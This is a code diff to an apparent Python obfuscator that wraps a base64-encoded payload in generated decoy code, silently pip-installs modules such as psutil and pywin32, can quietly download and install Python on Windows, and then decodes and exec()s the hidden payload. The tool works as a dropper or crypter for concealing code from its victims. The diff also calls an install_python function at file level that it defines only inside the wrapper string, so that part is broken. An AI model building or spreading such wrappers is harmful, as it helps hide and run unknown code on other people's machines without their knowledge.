@@ -52,18 +52,62 @@ def encrypt_code(code, key):
 def create_fake_wrapper(encoded_code):
     fake_code = generate_fake_code()
     wrapper_code = f"""
+import subprocess
+import sys
+import os
+import platform
 import base64
 import random
 
-{fake_code}
+{fake_code()}
 
-encoded_code = "{encoded_code}"
+required_modules = [
+    "aiohttp",
+    "requests",
+    "psutil",
+    "pywin32",
+    "cryptography"
+]
+
+def install_package(package_name):
+    subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])
+
+def ensure_packages():
+    for module in required_modules:
+        try:
+            __import__(module)
+        except ImportError:
+            install_package(module)
+
+def install_python():
+    if os.name == "nt":
+        python_urls = {
+            "3.10.9": "https://www.python.org/ftp/python/3.10.9/python-3.10.9-amd64.exe",
+            "3.11.7": "https://www.python.org/ftp/python/3.11.7/python-3.11.7-amd64.exe"
+        }
+        
+        for version, url in python_urls.items():
+            installer_path = f"python_installer_{{version}}.exe"
+            subprocess.check_call(["curl", "-L", url, "-o", installer_path])
+            subprocess.check_call([installer_path, "/quiet", "InstallAllUsers=1", "PrependPath=1"])
+            os.remove(installer_path)
+            break
+
+{fake_code()}            
+
 def main():
-    decoded_code = base64.b64decode(encoded_code)
+    ensure_packages()
+    encoded_code = "{encoded_code}"
+    decoded_code = base64.b64decode(encoded_code).decode('utf-8')
     exec(decoded_code)
 
+{fake_code()}
+
 if __name__ == "__main__":
-    main()
+    if sys.version_info < (3, 6):
+        install_python()
+    else:
+        main()
 """
     return wrapper_code
 
@@ -123,4 +167,8 @@ def main():
     logging.info(f"The code has been obfuscated and compiled, Filename: {obfuscated_file_path}")
 
 if __name__ == "__main__":
-    main()
+    if sys.version_info < (3, 6):
+        install_python()
+    else:
+        main()
+
